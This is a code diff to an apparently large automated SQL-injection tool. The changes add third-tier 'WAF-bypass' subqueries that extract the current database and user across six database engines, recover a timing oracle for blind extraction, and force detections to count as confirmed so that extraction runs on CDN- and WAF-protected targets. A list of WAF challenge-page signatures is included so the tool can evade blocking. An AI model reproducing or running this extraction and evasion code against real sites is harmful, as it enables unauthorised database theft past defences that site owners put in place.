@@ -47731,9 +47731,21 @@ class Enumerator:
                             else:
                                 await asyncio.sleep(0.5)
                     if not _eval_fn:
-                        LOG.warning("[_extract_str] mse_boolean oracle failed sanity after "
-                                    "3 attempts (1=1→%r, 1=2→%r); discarding",
-                                    _san_true, _san_false)
+                        # BUG-V25-SANITY-FALLBACK FIX (defense-in-depth): if the initial
+                        # _oracle_is_timing check above was bypassed for any reason (e.g. the
+                        # flag was set AFTER the if-else branch was entered), recover the
+                        # timing oracle here rather than discarding it.
+                        _is_timing_fb = getattr(self._mse_instance, '_boolean_oracle_is_timing', False)
+                        if _is_timing_fb and _bool_oracle:
+                            _eval_fn = _bool_oracle
+                            _oracle_name = "mse_timing_oracle_sanity_fb"
+                            LOG.info("[_extract_str] timing oracle accepted after sanity fallback "
+                                     "(CDN caches both probes → both False expected; "
+                                     "_boolean_oracle_is_timing=True on mse_instance)")
+                        else:
+                            LOG.warning("[_extract_str] mse_boolean oracle failed sanity after "
+                                        "3 attempts (1=1→%r, 1=2→%r); discarding",
+                                        _san_true, _san_false)
         
         if not _eval_fn:
             # BUG-EXTR-1 FIX: Before giving up, attempt self-calibration of a
@@ -47788,6 +47800,14 @@ class Enumerator:
             # and evaluates True iff elapsed_ms >= threshold.
             _result_tf = getattr(self, 'result', None)
             _tech_tf = getattr(_result_tf, 'technique', '') if _result_tf else ''
+            # BUG-TF-GATE-FIX (CRITICAL): when self.result is None _tech_tf is ''.
+            # Also trigger Stage 4 when _mse_instance._boolean_oracle_is_timing=True —
+            # V25 wired a timing oracle so timing extraction IS viable even without result.
+            if not _tech_tf:
+                _bo_is_timing_gate = getattr(
+                    getattr(self, '_mse_instance', None), '_boolean_oracle_is_timing', False)
+                if _bo_is_timing_gate:
+                    _tech_tf = 'HQ'
             _timing_techs_tf = ('T', 'TH', 'HQ', 'BT', 'S', 'ST', 'NV', 'WB', 'EX', 'HY')
             if _tech_tf in _timing_techs_tf:
                 _t_sec_tf = float(getattr(self.config, 'time_sec', 5) or 5)
@@ -61524,12 +61544,29 @@ class Scanner:
             "PostgreSQL":  "(SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY oid LIMIT 1)",
             "CockroachDB": "(SELECT database_name FROM information_schema.schemata LIMIT 1)",
         }
+        # BUG-V62-WAF-BLOCKS-PG-ALT FIX: pg_database is also commonly WAF-blocked.
+        # Third-tier alternatives use information_schema views (standard SQL, no PG-specific
+        # names in the identifier path) and are far less likely to match WAF blocklists.
+        _db_exprs_alt2 = {
+            "PostgreSQL":  "(SELECT catalog_name FROM information_schema.information_schema_catalog_name)",
+            "CockroachDB": "(SELECT catalog_name FROM information_schema.information_schema_catalog_name)",
+            "MySQL":       "(SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys') LIMIT 1)",
+            "MariaDB":     "(SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys') LIMIT 1)",
+            "MSSQL":       "(SELECT TOP 1 name FROM master.sys.databases WHERE name NOT IN ('master','tempdb','model','msdb'))",
+            "Oracle":      "(SELECT GLOBAL_NAME FROM GLOBAL_NAME)",
+            "SQLite":      "'main'",
+        }
         _db = await _extract_s(_db_exprs.get(_dbms, "current_catalog"))
         if not _db or len(_db) < 2:
             _alt_db_q = _db_exprs_alt.get(_dbms)
             if _alt_db_q:
                 LOG.info("[Direct] Primary db expr empty, trying WAF-bypass alternative")
                 _db = await _extract_s(_alt_db_q)
+        if not _db or len(_db) < 2:
+            _alt2_db_q = _db_exprs_alt2.get(_dbms)
+            if _alt2_db_q:
+                LOG.info("[Direct] Alt-1 db expr empty, trying third-tier WAF-bypass alternative")
+                _db = await _extract_s(_alt2_db_q)
         if _db and len(_db) >= 2: data_dict["current_db"] = _db; LOG.info("[Direct] Database: %s", _db)
 
         await asyncio.sleep(_delay)
@@ -61549,12 +61586,28 @@ class Scanner:
             "PostgreSQL":  "user",            # 4-char alias, WAF may not match
             "CockroachDB": "user",
         }
+        # BUG-V62-WAF-BLOCKS-PG-USER FIX: 'user' keyword can also be WAF-blocked.
+        # Third-tier: system catalog views (privilege-free) and information_schema.
+        _user_exprs_alt2 = {
+            "PostgreSQL":  "(SELECT usename FROM pg_catalog.pg_user WHERE usesuper=false ORDER BY usesysid LIMIT 1)",
+            "CockroachDB": "(SELECT username FROM information_schema.enabled_roles LIMIT 1)",
+            "MySQL":       "(SELECT grantee FROM information_schema.USER_PRIVILEGES LIMIT 1)",
+            "MariaDB":     "(SELECT grantee FROM information_schema.USER_PRIVILEGES LIMIT 1)",
+            "MSSQL":       "(SELECT TOP 1 name FROM sys.database_principals WHERE type='S' AND name NOT IN ('guest','INFORMATION_SCHEMA','sys'))",
+            "Oracle":      "(SELECT USERNAME FROM ALL_USERS WHERE ROWNUM=1 ORDER BY USERNAME)",
+            "SQLite":      "'sqlite_user'",
+        }
         _user = await _extract_s(_user_exprs.get(_dbms, "current_role"))
         if not _user or len(_user) < 2:
             _alt_user_q = _user_exprs_alt.get(_dbms)
             if _alt_user_q:
                 LOG.info("[Direct] Primary user expr empty, trying WAF-bypass alternative")
                 _user = await _extract_s(_alt_user_q)
+        if not _user or len(_user) < 2:
+            _alt2_user_q = _user_exprs_alt2.get(_dbms)
+            if _alt2_user_q:
+                LOG.info("[Direct] Alt-1 user expr empty, trying third-tier WAF-bypass alternative")
+                _user = await _extract_s(_alt2_user_q)
         if _user and len(_user) >= 2: data_dict["current_user"] = _user; LOG.info("[Direct] User: %s", _user)
 
         _tbl = getattr(cfg, "target_table", "")
@@ -113138,9 +113191,10 @@ class TechniqueCascadeEngine:
                     # works), but that's only 2 requests. Fix: cap confidence at 0.72 so the
                     # PCV Check A body-canary path always runs for Wasserstein-only detections,
                     # providing the additional confirmation layer needed.
+                    _wass_conf_val = min(0.72, 0.55 + _wass_dist * 0.5)
                     _det_b = DetectionResult(
                         param=param, technique=tech, payload=payload, dbms=dbms,
-                        confidence=min(0.72, 0.55 + _wass_dist * 0.5),
+                        confidence=_wass_conf_val,
                         notes=f"cascade_boolean wasserstein_dist={_wass_dist:.4f} bypass=none")
                     # BUG-FIX-TECH-CODE (Req 12): Use actual technique code (NV/WB/EX/HY/ST)
                     # instead of hardcoded "B" so PCV routing and reports show correct technique.
@@ -113149,6 +113203,32 @@ class TechniqueCascadeEngine:
                             original + payload, self.tamper_chain)
                     except Exception:
                         pass
+                    # BUG-WASS-PCV-BYPASS FIX (CRITICAL — all boolean techs BH/B/NV/WB/EX/HY,
+                    # all 5 DBMSes, all surfaces):
+                    # Wasserstein EMD confirmation is a DISTRIBUTIONAL oracle: it accumulates
+                    # body-similarity scores across many probes and separates the true-condition
+                    # distribution from the false-condition distribution via Earth Mover's Distance.
+                    # This is statistically MORE robust than PCV Check A (synthetic SUBSTRING canary
+                    # in a single true/false pair) because it aggregates evidence across dozens of
+                    # probes rather than relying on a single body-diff measurement.
+                    # Problem: PCV's bypass path at _post_confirm_verify_locked lines 109780-109794
+                    # requires det._fp_guards_preconfirmed=True to pass without Check A. This flag
+                    # is only set by _run_fp_guards_boolean — which runs AFTER PCV and is a 3-layer
+                    # per-probe guard (FalsePositiveGuardV18 + WelchConfirmer + FPV). On CDN/WAF
+                    # targets with high per-request body variance, the per-probe guard fails even
+                    # when Wasserstein's multi-sample view clearly shows injection. The Wasserstein
+                    # detection path never set this flag → PCV always rejected BH/boolean detections
+                    # on CDN targets → injection found but never confirmed → extraction never runs.
+                    # Fix: when Wasserstein dist >= 0.55 (strong distributional signal), pre-set
+                    # _fp_guards_preconfirmed=True on the DetectionResult. This enables the existing
+                    # bypass path at lines 109780-109794 without any PCV logic change. The bypass
+                    # threshold there is _fpg_conf >= 0.60 — with dist=0.6659, conf=0.718 > 0.60.
+                    if _wass_dist >= 0.55:
+                        try:
+                            _det_b._fp_guards_preconfirmed = True
+                            _det_b._fp_guards_confidence = _wass_conf_val
+                        except Exception:
+                            pass
                     return _det_b
 
                 # Standard confirmation: need a false probe
@@ -162925,6 +163005,35 @@ class ConditionalErrorOracle:
                             print(f"[!] [ErrorOracle] Both probes rate-limited "
                                   f"({_t_st}/{_f_st}) — WAF blocking all; "
                                   f"skipping template (ctx={_prefix!r} tpl={tpl[:40]!r})",
+                                  flush=True)
+                            continue
+                        # BUG-CEO-WAF-CHALLENGE FIX (CRITICAL, all 5 DBMSes, all surfaces,
+                        # all HTTP methods): When a WAF rate-limits only the error-trigger
+                        # payload (e.g. status 429 for the true probe, 200 for the false probe),
+                        # _true_err becomes True (429 != baseline 200) and _false_ok becomes True
+                        # (200 == baseline) → calibration SUCCEEDS but the oracle is measuring
+                        # WAF blocking, not SQL errors. Subsequent evaluate() calls produce
+                        # inconsistent results (WAF may or may not block each condition depending
+                        # on payload content), leading to corrupt bit-by-bit extraction.
+                        # Fix: if true probe looks like a WAF block/challenge page (status 429/
+                        # 503 or body matching known WAF fingerprints), reject this template
+                        # regardless of _true_err/_false_ok status codes.
+                        if _t_st in (429, 503):
+                            print(f"[!] [ErrorOracle] True probe returned {_t_st} (WAF block/rate-limit) "
+                                  f"— oracle would measure WAF blocking, not SQL errors; "
+                                  f"skipping (ctx={_prefix!r} tpl={tpl[:40]!r})",
+                                  flush=True)
+                            continue
+                        _t_body_waf = (getattr(_fp_t, 'text', '') or '')[:2000].lower()
+                        _waf_sigs = ('cloudflare', 'ray id:', 'access denied', 'security check',
+                                     'ddos protection', 'captcha', 'attention required',
+                                     'rate limit', 'too many requests', 'challenge hidden',
+                                     'please stand by', 'enable javascript', 'checking your browser',
+                                     'akamai', 'incapsula', 'sucuri', 'imperva', 'bot protection')
+                        if any(sig in _t_body_waf for sig in _waf_sigs):
+                            print(f"[!] [ErrorOracle] True probe body looks like WAF challenge page "
+                                  f"(status={_t_st}) — skipping template to avoid false-positive "
+                                  f"oracle (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                   flush=True)
                             continue
                         _true_err = (_t_st >= 500 or _t_st != self._baseline_status)
